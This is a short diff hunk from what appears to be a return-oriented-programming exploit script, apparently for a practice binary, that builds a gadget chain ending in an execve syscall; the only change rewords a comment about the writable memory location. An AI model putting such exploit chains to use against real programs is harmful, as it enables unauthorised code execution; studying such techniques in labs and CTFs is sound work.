@@ -23,7 +23,7 @@ chain += rw_section
 chain += b'JUNKJUNK'
 chain += mov_ptr_rax
 
-# perform a syscall with execve using .data location.
+# perform a syscall with execve using rw location.
 
 pop_rax     = p64(0x0000000000415664)
 execve      = p64(0x3b)
